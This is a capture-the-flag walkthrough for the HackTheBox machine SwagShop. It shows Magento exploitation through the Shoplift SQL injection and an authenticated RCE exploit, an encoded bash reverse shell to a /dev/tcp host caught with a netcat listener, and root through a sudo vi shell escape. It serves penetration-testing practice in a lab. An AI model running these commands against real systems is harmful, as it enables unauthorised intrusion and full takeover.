At http://swagshop.htb/var/session/ we found some session logs and we found the credentials ypwq:f4c8e326312d5ddb79c04b408e55010a:rp which seem to be the cookie for the user ypwq but it's a dead end.

After that we found **[this exploit](https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py)** and it creates a user ypwq:123 which we can use in http://swagshop.htb/admin

With a valid credentials, we can gain RCE with **[this exploit ](https://www.exploit-db.com/exploits/37811)**. We had some problems so we have to edit the following parameters

```bash
# Config.
username = 'ypwq'
password = '123'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.
```

And comment the following line

```bash
# br.form.new_control('text', 'login[username]', {'value': username})  # Had to manually add username control.
```

After that we encode a reverse shell and send it to execute and catch the shell with a netcat listener

```bash
┌──(venv) (kali㉿kali)-[~/Documents/MyApps/burbles-by-peluqqi]
└─$ echo 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC85MDAxIDA+JjEK

┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/SwagShop-10.10.10.140]
└─$ python 37811.py http://swagshop.htb/index.php/admin "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC85MDAxIDA+JjEK'|base64 -d|bash"

----------------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.140] 41440
bash: cannot set terminal process group (1653): Inappropriate ioctl for device
bash: no job control in this shell
www-data@swagshop:/var/www/html$ whoami
www-data
```

Then we found that we can execute vi as sudo in /var/www/html/ folder

```bash
www-data@swagshop:/var/www/html$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

Edit some file inside the folder with /usr/bin/vi and as we find in GTFOBin we can spawn an interactive shell by executing the commands (inside the editor) `:set shell=/bin/sh` and `:shell`

And we are root
